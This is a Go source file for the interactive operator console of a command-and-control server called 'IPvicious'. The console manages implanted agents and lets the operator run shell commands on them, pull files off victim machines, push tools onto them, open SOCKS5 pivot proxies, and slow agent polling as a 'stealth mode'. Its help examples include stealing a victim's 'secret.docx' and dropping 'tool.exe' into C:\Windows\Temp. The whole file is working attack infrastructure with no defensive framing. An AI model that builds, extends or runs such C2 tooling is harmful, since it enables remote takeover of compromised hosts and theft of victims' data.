//go:build linux

// Package cli provides an interactive operator shell (REPL) for the C2 server.
//
// Commands:
//
//	help                         – list commands
//	status                       – agent connection status
//	streams                      – list active SOCKS5 relay streams
//	cmd  <command>               – execute a shell command on the agent
//	get  <remote> [local]        – download a file from the agent
//	put  <local>  <remote>       – upload a file to the agent
//	close <stream_id>            – close a relay stream
//	exit / quit                  – shut down the C2 server
//
// All output from the agent (command results, file chunks) is delivered via
// the tunnel callbacks which may fire from arbitrary goroutines. The REPL
// serialises all terminal I/O through a single mutex so that async output
// never visually corrupts a half-typed command line.
package cli

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"ipvicious/internal/protocol"
	"ipvicious/internal/socks5"
	"ipvicious/internal/tunnel"
)

// ─── ANSI colour helpers ──────────────────────────────────────────────────────

const (
	colReset  = "\033[0m"
	colBold   = "\033[1m"
	colRed    = "\033[31m"
	colGreen  = "\033[32m"
	colYellow = "\033[33m"
	colCyan   = "\033[36m"
	colGray   = "\033[90m"
)

// prompt is the operator prompt string.
const promptStr = colBold + colGreen + "IPvicious" + colReset + colBold + "> " + colReset

// ─── download state ───────────────────────────────────────────────────────────

// dlState tracks an in-progress file download (agent → C2).
type dlState struct {
	localPath string
	file      *os.File
	bytes     int64
	started   time.Time
}

// ─── per-agent state ──────────────────────────────────────────────────────────

// agentState holds per-agent terminal state (active download, running proxies).
type agentState struct {
	dl      *dlState
	proxies map[string]*socks5.Proxy // listen-addr → Proxy
}

// ─── REPL ─────────────────────────────────────────────────────────────────────

// REPL is the interactive operator shell.
type REPL struct {
	tun           *tunnel.ServerTunnel
	stopFn        func()
	nextSocksPort int // next port to allocate for the socks command

	mu          sync.Mutex
	agentOrder  []string               // insertion order for stable indexing
	agentStates map[string]*agentState // key → state
	activeKey   string                 // currently selected agent key
	promptOn    bool                   // true when prompt is displayed
}

// New creates a REPL backed by tun and wires all agent callbacks to it.
// stopFn is called when the operator types 'exit'; it should close the stop
// channel in main so that deferred cleanup runs properly.
// firstSocksPort is the first TCP port used for automatic SOCKS5 allocation.
// Call Run to start the interactive loop.
func New(tun *tunnel.ServerTunnel, stopFn func(), firstSocksPort int) *REPL {
	r := &REPL{
		tun:           tun,
		stopFn:        stopFn,
		nextSocksPort: firstSocksPort,
		agentStates:   make(map[string]*agentState),
	}

	// Wire tunnel callbacks before returning so no events are missed.
	tun.OnHello = func(key string, addr net.Addr) {
		r.registerAgent(key)
		echoID := 0
		if e := r.tun.Agent(key); e != nil {
			echoID = e.EchoID
		}
		r.asyncPrintf(colYellow+"[+] new agent %s (echo#%d from %s)"+colReset+"\n",
			key, echoID, addr)
	}
	tun.OnCmdOut = func(key string, _ uint32, _ uint32, data []byte) {
		r.mu.Lock()
		active := r.activeKey
		r.mu.Unlock()
		if key == active {
			r.asyncWrite(data)
		}
	}
	tun.OnFileData = func(key string, _ uint32, _ uint32, data []byte, last bool) {
		// Route to all agents, not just the active one: a download started on
		// agent N must complete even if the operator switches to another agent.
		r.handleFileData(key, data, last)
	}

	return r
}

// registerAgent adds key to agentOrder/agentStates if not already present.
// Safe to call from any goroutine.
func (r *REPL) registerAgent(key string) {
	r.mu.Lock()
	defer r.mu.Unlock()
	if _, ok := r.agentStates[key]; ok {
		return
	}
	r.agentOrder = append(r.agentOrder, key)
	r.agentStates[key] = &agentState{
		proxies: make(map[string]*socks5.Proxy),
	}
	// Auto-select the first agent that connects.
	if r.activeKey == "" {
		r.activeKey = key
	}
}

// activeAgent returns the *AgentEntry for the currently selected agent,
// or nil if no agent is selected. Caller must NOT hold r.mu.
func (r *REPL) activeAgent() *tunnel.AgentEntry {
	r.mu.Lock()
	key := r.activeKey
	r.mu.Unlock()
	if key == "" {
		return nil
	}
	return r.tun.Agent(key)
}

// Run starts the interactive REPL loop; it blocks until stop is closed or
// stdin is exhausted.
func (r *REPL) Run(stop <-chan struct{}) {
	r.infof("IPvicious C2 — interactive shell. Type %shelp%s for commands.\n",
		colBold, colReset)
	r.printPrompt()

	scanner := bufio.NewScanner(os.Stdin)
	lineCh := make(chan string)

	go func() {
		for scanner.Scan() {
			lineCh <- scanner.Text()
		}
		if err := scanner.Err(); err != nil {
			r.errf("stdin scanner: %v\n", err)
		}
		close(lineCh)
	}()

	for {
		select {
		case <-stop:
			return
		case line, ok := <-lineCh:
			if !ok {
				return
			}
			r.clearPrompt()
			r.dispatch(strings.TrimSpace(line))
			r.printPrompt()
		}
	}
}

// ─── command dispatcher ───────────────────────────────────────────────────────

func (r *REPL) dispatch(line string) {
	if line == "" {
		return
	}
	fields := strings.Fields(line)
	verb := strings.ToLower(fields[0])
	args := fields[1:]

	switch verb {
	case "help", "?":
		r.cmdHelp()
	case "agents":
		r.cmdAgents()
	case "select":
		r.cmdSelect(args)
	case "status":
		r.cmdStatus()
	case "streams":
		r.cmdStreams()
	case "socks":
		r.cmdSocks(args)
	case "stopsocks":
		if len(args) < 1 {
			r.errf("usage: stopsocks <listen_addr>\n")
			return
		}
		r.cmdStopSocks(args[0])
	case "cmd", "shell", "exec":
		if len(args) == 0 {
			r.errf("usage: cmd <command>\n")
			return
		}
		r.cmdExec(strings.Join(args, " "))
	case "get", "download":
		if len(args) < 1 {
			r.errf("usage: get <remote_path> [local_save_path]\n")
			return
		}
		local := ""
		if len(args) >= 2 {
			local = args[1]
		}
		r.cmdGet(args[0], local)
	case "put", "upload":
		if len(args) < 2 {
			r.errf("usage: put <local_path> <remote_path>\n")
			return
		}
		r.cmdPut(args[0], strings.Join(args[1:], " "))
	case "close":
		if len(args) < 1 {
			r.errf("usage: close <stream_id>\n")
			return
		}
		id, err := strconv.ParseUint(args[0], 10, 32)
		if err != nil {
			r.errf("invalid stream id: %v\n", err)
			return
		}
		agent := r.activeAgent()
		if agent == nil {
			r.errf("no active agent — use 'agents' and 'select <n>'\n")
			return
		}
		agent.CloseStream(uint32(id))
		r.infof("close request sent for stream %d\n", id)
	case "sleep":
		if len(args) < 1 {
			r.errf("usage: sleep <minutes>\n")
			return
		}
		r.cmdSleep(args[0])
	case "wake":
		ms := uint32(50) // default fast poll
		if len(args) >= 1 {
			v, err := strconv.ParseUint(args[0], 10, 32)
			if err != nil || v < 10 {
				r.errf("usage: wake [ms]  (minimum 10)\n")
				return
			}
			ms = uint32(v)
		}
		r.cmdWake(ms)
	case "exit", "quit", "q":
		r.infof("shutting down...\n")
		r.stopFn()
	default:
		r.errf("unknown command %q — type 'help'\n", verb)
	}
}

// ─── command implementations ──────────────────────────────────────────────────

func (r *REPL) cmdHelp() {
	help := colCyan + colBold + "Available commands:" + colReset + `

  ` + colBold + `agents` + colReset + `                      List all connected agents
  ` + colBold + `select <n>` + colReset + `                  Select active agent by index (from 'agents')
  ` + colBold + `status` + colReset + `                      Active agent connection info + poll interval
  ` + colBold + `streams` + colReset + `                     List active relay streams for active agent
  ` + colBold + `cmd  <command>` + colReset + `              Execute shell command on active agent
  ` + colBold + `get  <remote> [local]` + colReset + `       Download file from active agent
  ` + colBold + `put  <local>  <remote>` + colReset + `      Upload file to active agent
  ` + colBold + `socks [port]` + colReset + `                Start SOCKS5 proxy for active agent (auto-port if omitted)
  ` + colBold + `stopsocks <addr>` + colReset + `            Stop a SOCKS5 proxy by listen address
  ` + colBold + `sleep <minutes>` + colReset + `             Slow active agent polling (stealth mode)
  ` + colBold + `wake  [ms]` + colReset + `                  Resume fast polling on active agent (default 50 ms)
  ` + colBold + `close <id>` + colReset + `                  Close a relay stream by ID
  ` + colBold + `help` + colReset + `                        This message
  ` + colBold + `exit` + colReset + `                        Shut down C2 server

` + colGray + `Examples:
  agents  select 1
  cmd whoami /all
  get C:\Users\victim\Desktop\secret.docx ./secret.docx
  put ./tool.exe C:\Windows\Temp\tool.exe
  socks            # auto-allocate port
  socks 1081       # specific port
  stopsocks 127.0.0.1:1081
  sleep 10         # poll every 10 minutes
  wake             # back to 50 ms
  close 3
` + colReset
	fmt.Print(help)
}

func (r *REPL) cmdAgents() {
	r.mu.Lock()
	order := make([]string, len(r.agentOrder))
	copy(order, r.agentOrder)
	active := r.activeKey
	r.mu.Unlock()

	if len(order) == 0 {
		r.infof("no agents connected\n")
		return
	}

	r.infof("%d agent(s):\n", len(order))
	for i, key := range order {
		entry := r.tun.Agent(key)
		marker := "  "
		if key == active {
			marker = colGreen + "* " + colReset
		}
		if entry == nil {
			r.infof("%s[%d] %s (gone)\n", marker, i+1, key)
			continue
		}
		sess := entry.Session()
		poll := "?"
		if sess.AgentPollMs > 0 {
			poll = formatPollMs(sess.AgentPollMs)
		}
		lastPoll := "never"
		if !sess.LastPoll.IsZero() {
			lastPoll = fmt.Sprintf("%s ago", time.Since(sess.LastPoll).Round(time.Millisecond))
		}
		r.mu.Lock()
		proxyAddrs := ""
		if st, ok := r.agentStates[key]; ok && len(st.proxies) > 0 {
			parts := make([]string, 0, len(st.proxies))
			for addr := range st.proxies {
				parts = append(parts, addr)
			}
			proxyAddrs = " socks=[" + strings.Join(parts, ",") + "]"
		}
		r.mu.Unlock()
		r.infof("%s[%d] %s  echo#%d  poll=%s  last=%s  streams=%d%s\n",
			marker, i+1, sess.Addr, entry.EchoID, poll, lastPoll,
			entry.Streams().Len(), proxyAddrs)
	}
}

func (r *REPL) cmdSelect(args []string) {
	if len(args) < 1 {
		r.errf("usage: select <n>\n")
		return
	}
	n, err := strconv.Atoi(args[0])
	if err != nil || n < 1 {
		r.errf("invalid index: %s\n", args[0])
		return
	}
	r.mu.Lock()
	if n > len(r.agentOrder) {
		r.mu.Unlock()
		r.errf("no agent #%d — run 'agents' to see the list\n", n)
		return
	}
	key := r.agentOrder[n-1]
	r.activeKey = key
	r.mu.Unlock()
	r.infof("active agent → [%d] %s\n", n, key)
}

func (r *REPL) cmdStatus() {
	agent := r.activeAgent()
	if agent == nil {
		r.infof("no active agent — use 'agents' and 'select <n>'\n")
		return
	}
	sess := agent.Session()

	poll := "unknown"
	if sess.AgentPollMs > 0 {
		poll = formatPollMs(sess.AgentPollMs)
	}

	lastPoll := "never"
	if !sess.LastPoll.IsZero() {
		lastPoll = fmt.Sprintf("%s ago", time.Since(sess.LastPoll).Round(time.Millisecond))
	}

	nextPoll := "unknown"
	if !sess.NextPoll.IsZero() {
		d := time.Until(sess.NextPoll).Round(time.Millisecond)
		if d >= 0 {
			nextPoll = fmt.Sprintf("in %s", d)
		} else {
			nextPoll = fmt.Sprintf("overdue by %s", (-d).String())
		}
	}

	r.infof("  Address   : %s\n", sess.Addr)
	r.infof("  Echo ID   : %d  (unique per agent.exe process)\n", agent.EchoID)
	r.infof("  Last poll : %s\n", lastPoll)
	r.infof("  Next poll : %s\n", nextPoll)
	r.infof("  Interval  : %s\n", poll)
}

// formatPollMs renders a millisecond value as a human-friendly string:
// sub-second values show as "Nms", values ≥ 1000 ms show as "N.Xs" or "Nm Xs".
func formatPollMs(ms uint32) string {
	if ms < 1000 {
		return fmt.Sprintf("%d ms", ms)
	}
	secs := float64(ms) / 1000.0
	if secs < 60 {
		return fmt.Sprintf("%.1f s", secs)
	}
	mins := int(secs) / 60
	remSecs := int(secs) % 60
	if remSecs == 0 {
		return fmt.Sprintf("%d min", mins)
	}
	return fmt.Sprintf("%d min %d s", mins, remSecs)
}

// cmdSocks starts a SOCKS5 proxy for the active agent on the given port.
// If args is empty the next auto-allocated port is used.
func (r *REPL) cmdSocks(args []string) {
	agent := r.activeAgent()
	if agent == nil {
		r.errf("no active agent — use 'agents' and 'select <n>'\n")
		return
	}
	r.mu.Lock()
	port := r.nextSocksPort
	if len(args) >= 1 {
		p, err := strconv.Atoi(args[0])
		if err != nil || p < 1 || p > 65535 {
			r.mu.Unlock()
			r.errf("invalid port: %s\n", args[0])
			return
		}
		port = p
	} else {
		r.nextSocksPort++
	}
	key := r.activeKey
	r.mu.Unlock()

	proxy := socks5.New(agent)
	addr := fmt.Sprintf("127.0.0.1:%d", port)
	if err := proxy.Listen(addr); err != nil {
		r.errf("socks listen %s: %v\n", addr, err)
		return
	}
	r.mu.Lock()
	// Advance nextSocksPort past any successfully bound port so that future
	// auto-allocations never collide with manually-specified ports.
	if port >= r.nextSocksPort {
		r.nextSocksPort = port + 1
	}
	if st, ok := r.agentStates[key]; ok {
		st.proxies[proxy.Addr()] = proxy
	}
	r.mu.Unlock()
	r.infof("SOCKS5 proxy for agent %s listening on %s%s%s\n",
		key, colBold, proxy.Addr(), colReset)
}

// cmdStopSocks stops the SOCKS5 proxy identified by its listen address.
func (r *REPL) cmdStopSocks(addr string) {
	r.mu.Lock()
	key := r.activeKey
	var proxy *socks5.Proxy
	if key != "" {
		if st, ok := r.agentStates[key]; ok {
			if p, ok := st.proxies[addr]; ok {
				proxy = p
				delete(st.proxies, addr)
			}
		}
	}
	r.mu.Unlock()
	if proxy == nil {
		r.errf("no proxy at %s for active agent\n", addr)
		return
	}
	proxy.Close()
	r.infof("SOCKS5 proxy %s stopped\n", addr)
}

// cmdSleep instructs the active agent to slow its poll to every `arg` minutes.
func (r *REPL) cmdSleep(arg string) {
	agent := r.activeAgent()
	if agent == nil {
		r.errf("no active agent\n")
		return
	}
	mins, err := strconv.ParseFloat(arg, 64)
	if err != nil || mins <= 0 {
		r.errf("usage: sleep <minutes>  (e.g. 'sleep 5' or 'sleep 0.5')\n")
		return
	}
	ms := uint32(mins * 60 * 1000)
	if ms < 10 {
		ms = 10
	}
	agent.SetPollInterval(ms)
	r.infof("agent poll slowed to %s (stealth mode)\n", formatPollMs(ms))
}

// cmdWake instructs the active agent to resume fast polling at pollMs milliseconds.
func (r *REPL) cmdWake(pollMs uint32) {
	agent := r.activeAgent()
	if agent == nil {
		r.errf("no active agent\n")
		return
	}
	agent.SetPollInterval(pollMs)
	r.infof("agent poll set to %s\n", formatPollMs(pollMs))
}

func (r *REPL) cmdStreams() {
	agent := r.activeAgent()
	if agent == nil {
		r.infof("no active agent\n")
		return
	}
	streams := agent.Streams()
	n := streams.Len()
	if n == 0 {
		r.infof("no active relay streams\n")
		return
	}
	r.infof("%d active stream(s):\n", n)
	streams.ForEach(func(s *tunnel.Stream) {
		state := "open"
		if s.IsClosed() {
			state = "closed"
		}
		r.infof("  [%d] %s  sendq=%d recvq=%d\n",
			s.ID, state, len(s.SendBuf), len(s.RecvBuf))
	})
}

func (r *REPL) cmdExec(cmd string) {
	agent := r.activeAgent()
	if agent == nil {
		r.errf("no active agent — use 'agents' and 'select <n>'\n")
		return
	}
	r.infof("sending command: %s%s%s\n", colBold, cmd, colReset)
	agent.SendCmd(cmd)
}

func (r *REPL) cmdGet(remotePath, localPath string) {
	agent := r.activeAgent()
	if agent == nil {
		r.errf("no active agent — use 'agents' and 'select <n>'\n")
		return
	}
	r.mu.Lock()
	key := r.activeKey
	st := r.agentStates[key]
	if st.dl != nil {
		r.mu.Unlock()
		r.errf("a download is already in progress (%s) — wait for it to finish\n",
			st.dl.localPath)
		return
	}
	// Derive local path from the remote basename if not specified.
	if localPath == "" {
		localPath = filepath.Base(strings.ReplaceAll(remotePath, `\`, "/"))
		if localPath == "" || localPath == "." {
			localPath = "download"
		}
	}
	f, err := os.Create(localPath)
	if err != nil {
		r.mu.Unlock()
		r.errf("cannot create local file %q: %v\n", localPath, err)
		return
	}
	st.dl = &dlState{localPath: localPath, file: f, started: time.Now()}
	r.mu.Unlock()
	r.infof("downloading %s%s%s → %s%s%s\n",
		colBold, remotePath, colReset, colBold, localPath, colReset)
	agent.SendFileGet(remotePath)
}

func (r *REPL) cmdPut(localPath, remotePath string) {
	agent := r.activeAgent()
	if agent == nil {
		r.errf("no active agent — use 'agents' and 'select <n>'\n")
		return
	}
	f, err := os.Open(localPath)
	if err != nil {
		r.errf("cannot open %q: %v\n", localPath, err)
		return
	}
	defer f.Close()

	info, err := f.Stat()
	if err != nil {
		r.errf("stat %q: %v\n", localPath, err)
		return
	}

	r.infof("uploading %s%s%s (%d bytes) → %s%s%s\n",
		colBold, localPath, colReset, info.Size(),
		colBold, remotePath, colReset)

	buf := make([]byte, protocol.MaxData)
	first := true
	var total int64

	for {
		n, readErr := f.Read(buf)
		if n > 0 {
			chunk := make([]byte, n)
			copy(chunk, buf[:n])
			if first {
				agent.SendFilePut(remotePath, chunk)
				first = false
			} else {
				agent.SendFileData(chunk)
			}
			total += int64(n)
		}
		if readErr == io.EOF {
			break
		}
		if readErr != nil {
			r.errf("read error: %v\n", readErr)
			return
		}
	}

	if first {
		agent.SendFilePut(remotePath, nil)
	}
	agent.SendFileEnd()
	r.infof("upload queued: %d bytes in %d chunk(s)\n",
		total, (total/int64(protocol.MaxData))+1)
}

// ─── async callbacks ──────────────────────────────────────────────────────────

// handleFileData is invoked by the OnFileData tunnel callback (arbitrary goroutine).
func (r *REPL) handleFileData(key string, data []byte, last bool) {
	r.mu.Lock()
	defer r.mu.Unlock()

	st, ok := r.agentStates[key]
	if !ok || st.dl == nil {
		return
	}

	if len(data) > 0 {
		if _, err := st.dl.file.Write(data); err != nil {
			r.printLocked(colRed + "[!] write error: " + err.Error() + colReset + "\n")
			st.dl.file.Close()
			st.dl = nil
			return
		}
		st.dl.bytes += int64(len(data))
	}

	if last {
		duration := time.Since(st.dl.started).Round(time.Millisecond)
		st.dl.file.Close()
		msg := fmt.Sprintf(colGreen+"[+] download complete: %s (%d bytes, %s)"+colReset+"\n",
			st.dl.localPath, st.dl.bytes, duration)
		st.dl = nil
		r.clearPromptLocked()
		fmt.Print(msg)
		r.printPromptLocked()
	}
}

// asyncPrintf is safe to call from any goroutine; it clears the prompt,
// prints the message, and reprints the prompt.
func (r *REPL) asyncPrintf(format string, a ...interface{}) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.clearPromptLocked()
	fmt.Printf(format, a...)
	r.printPromptLocked()
}

// asyncWrite prints raw bytes (e.g. command output) asynchronously.
func (r *REPL) asyncWrite(data []byte) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.clearPromptLocked()
	os.Stdout.Write(data)
	// Ensure output ends with a newline before reprinting prompt.
	if len(data) > 0 && data[len(data)-1] != '\n' {
		fmt.Println()
	}
	r.printPromptLocked()
}

// ─── terminal helpers (must hold mu unless noted) ─────────────────────────────

// printPrompt prints the prompt and marks it as displayed.
func (r *REPL) printPrompt() {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.printPromptLocked()
}

// currentPromptLocked returns the prompt string for the current state.
// When an agent is selected it includes the 1-based index, e.g. "IPvicious[2]> ".
// Must be called with r.mu held.
func (r *REPL) currentPromptLocked() string {
	if r.activeKey != "" {
		for i, k := range r.agentOrder {
			if k == r.activeKey {
				return fmt.Sprintf(colBold+colGreen+"IPvicious[%d]"+colReset+colBold+"> "+colReset, i+1)
			}
		}
	}
	return promptStr
}

func (r *REPL) printPromptLocked() {
	fmt.Print(r.currentPromptLocked())
	r.promptOn = true
}

// clearPrompt erases the prompt line (ANSI: carriage-return + erase-to-EOL).
func (r *REPL) clearPrompt() {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.clearPromptLocked()
}

func (r *REPL) clearPromptLocked() {
	if r.promptOn {
		fmt.Print("\r\033[K")
		r.promptOn = false
	}
}

// printLocked writes directly without acquiring mu (caller must hold it).
func (r *REPL) printLocked(s string) {
	r.clearPromptLocked()
	fmt.Print(s)
	r.printPromptLocked()
}

// infof prints an informational message (yellow star prefix) under mu so it
// cannot interleave with async callback output.
func (r *REPL) infof(format string, a ...interface{}) {
	r.mu.Lock()
	defer r.mu.Unlock()
	fmt.Printf(colYellow+"[*] "+colReset+format, a...)
}

// errf prints an error message (red bang prefix) under mu.
func (r *REPL) errf(format string, a ...interface{}) {
	r.mu.Lock()
	defer r.mu.Unlock()
	fmt.Fprintf(os.Stderr, colRed+"[!] "+colReset+format, a...)
}
